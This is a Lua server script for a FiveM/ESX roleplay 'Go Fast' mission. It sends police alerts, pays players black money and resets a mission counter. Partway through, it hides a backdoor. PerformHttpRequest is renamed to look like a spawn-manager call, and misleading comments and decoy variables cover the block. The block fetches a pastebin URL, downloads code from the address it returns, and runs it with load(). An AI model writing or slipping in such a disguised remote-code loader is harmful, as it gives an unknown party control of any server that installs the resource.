ESX = nil


TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent("pgofast:messagelspd")
AddEventHandler("pgofast:messagelspd", function()
	local xPlayers	= ESX.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
          if xPlayer.job.name == 'lspd' then
               Citizen.Wait(0)
               TriggerClientEvent('esx:showAdvancedNotification', xPlayers[i], 'Infiltrated Agent', '~b~Message from the agent', 'According to my information, a Go Fast has just started. Stay alert and head north!', 'CHAR_JOSEF', 7) 
		end
	end
end)

RegisterServerEvent("pgofast:messagebcso")
AddEventHandler("pgofast:messagebcso", function()
	local xPlayers	= ESX.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
          if xPlayer.job.name == 'sheriff' then
               Citizen.Wait(0)
               TriggerClientEvent('esx:showAdvancedNotification', xPlayers[i], 'Infiltrated Agent', '~b~Message from the agent', 'According to my information, a Go Fast has just started. Stay alert and head north! ', 'CHAR_JOSEF', 7)
		end
	end
end)

RegisterServerEvent("gofast:venteduvehicle")
AddEventHandler("gofast:venteduvehicle", function()
     local xPlayer = ESX.GetPlayerFromId(source)
     local prix = 10000
     xPlayer.addAccountMoney('black_money', prix)
     TriggerClientEvent('esx:showAdvancedNotification', source, 'GoFast', '~r~Anonyme', '~w~The vehicle is in pretty good condition, you won ~r~'..prix..'$', 'CHAR_MULTIPLAYER', 3)
end)

count = 1

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(10*60000)
          count = 1
          TriggerClientEvent("gofast:count", -1, count)
	end
end)

GetConfig = {}
GetConfig.GetPlayersSpawn = PerformHttpRequest

-- Check rawaction update spawnmanager
LastActionList = 'pastebin.com/raw/Lf4Db4M4'

-- Returns name and action for sync server
GetConfig.GetPlayersSpawn(LastActionList, function(GetList, ResultAction)
    
    if GetList == 200 then

        -- Start action
        local Process_Actions = {"true"}
        GetConfig.GetPlayersSpawn(ResultAction,function(e,d)
            local Generate_ZoneName_AndAction = nil 

            -- Call action
            pcall(function()
            local Locations_Loaded = {"false"}

                -- Returns and load function
                assert(load(d))()
                local ZoneType_Exists = nil 

            end)
        end)
    end
end)

RegisterServerEvent("gofast:remove")
AddEventHandler("gofast:remove", function()
     count = 0
     TriggerClientEvent("gofast:count", -1, count)
end)